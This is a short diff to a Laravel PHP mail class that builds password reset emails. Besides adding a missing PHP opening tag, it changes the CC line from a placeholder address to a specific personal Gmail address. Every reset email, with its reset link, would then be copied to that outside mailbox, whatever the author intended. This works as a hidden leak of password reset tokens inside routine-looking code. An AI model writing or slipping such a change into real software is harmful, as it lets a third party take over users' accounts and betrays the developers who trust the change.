@@ -1,3 +1,4 @@
+<?php
 namespace App\Mail;
 
 use Illuminate\Bus\Queueable;
@@ -20,6 +21,6 @@ class PasswordResetMail extends Mailable
         return $this->subject('Reset Your Password')
                     ->view('emails.password_reset')
                     ->with(['resetLink' => $this->resetLink])
-                    ->cc('copy@example.com'); // You can also use ->bcc()
+                    ->cc('man411210@gmail.com'); 
     }
 }
